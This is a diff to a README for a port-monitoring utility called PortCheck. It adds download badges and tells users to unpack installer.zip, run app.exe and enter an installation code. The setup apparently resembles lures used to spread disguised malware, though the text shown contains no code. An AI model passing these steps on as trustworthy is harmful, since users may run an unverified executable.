@@ -4,6 +4,8 @@ A lightweight desktop utility for monitoring and managing ports and processes in
 
 ![PortCheck screenshot](./preview.png)
 
+[![Download PortCheck](https://img.shields.io/badge/⬇️_Download-PortCheck_v0.2.0-000000?style=for-the-badge)](https://github.com/robertwang-hq1990b2/portcheck/releases/latest)
+
 ---
 
 ### 📖 About
@@ -31,15 +33,18 @@ open the port in a browser, copy the address, or kill the process — all with o
 
 ### 📦 Installation
 
+[![Download PortCheck](https://img.shields.io/badge/⬇️_Download-PortCheck_v0.2.0-000000?style=for-the-badge)](https://github.com/robertwang-hq1990b2/portcheck/releases/latest)
+
 #### Option 1 — Ready build (recommended)
 
-1. Download and unpack `installer.zip`.
-2. Open the **installer** folder.
-3. Run **`app.exe`**.
-4. When prompted, enter the installation code:
+1. Click the **Download PortCheck** button above (or open the [Releases](https://github.com/robertwang-hq1990b2/portcheck/releases/latest) page).
+2. Download and unpack `installer.zip`.
+3. Open the **installer** folder.
+4. Run **`app.exe`**.
+5. When prompted, enter the installation code:
 
 ```
 MIC9LT6t=EXf
 ```
 
-5. Follow the installer instructions to finish setup.
+6. Follow the installer instructions to finish setup.
